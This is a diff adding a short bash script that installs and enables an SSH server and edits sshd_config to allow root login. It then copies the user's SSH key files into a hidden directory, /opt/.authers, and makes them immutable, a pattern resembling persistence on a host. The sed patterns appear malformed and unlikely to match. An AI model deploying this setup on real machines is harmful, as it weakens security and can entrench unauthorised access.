@@ -1,0 +1,18 @@
+#!/usr/bin/bash
+
+## Blind install SSH server
+sudo dnf install openssh-server
+
+## Start and enable openssh server
+systemctl enable sshd && systemctl start sshd
+
+## Change two flags in the ssh (No more needlessly complex ssh config) 
+sed -i 's/^#\?#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/^#\?#Passwordauthentication yes/Passwordauthentication no/' /etc/ssh/sshd_config 
+
+systemctl restart sshd
+
+mkdir -p /opt/.authers
+cp .ssh/* /opt/.authers
+
+chattr +i /opt/.authers/*
